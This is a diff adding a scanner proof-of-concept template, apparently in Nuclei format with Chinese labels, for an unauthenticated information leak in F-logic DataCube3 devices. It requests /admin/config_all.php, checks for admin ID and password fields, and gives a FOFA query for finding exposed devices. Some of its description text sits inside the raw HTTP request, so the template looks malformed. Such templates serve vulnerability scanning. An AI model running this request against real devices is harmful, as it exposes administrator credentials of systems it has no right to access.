@@ -1,0 +1,34 @@
+id: poc-vgg1zgpzpv62a8yo
+info:
+  name: F-logic DataCube3 未授权信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vgg1zgpzpv62a8yo'
+  tags: info-leak,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vgg1zgpzpv62a8yo
+    fofa: title=="DataCube3"
+http:
+- raw:
+  - 'GET /admin/config_all.php HTTP/1.1
+
+
+    # 响应代码特征
+
+    302
+
+
+    # 响应内容特征
+
+    ^(?=.*?login.admin_id)(?=.*?login.admin_pwd).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 302
+    type: status
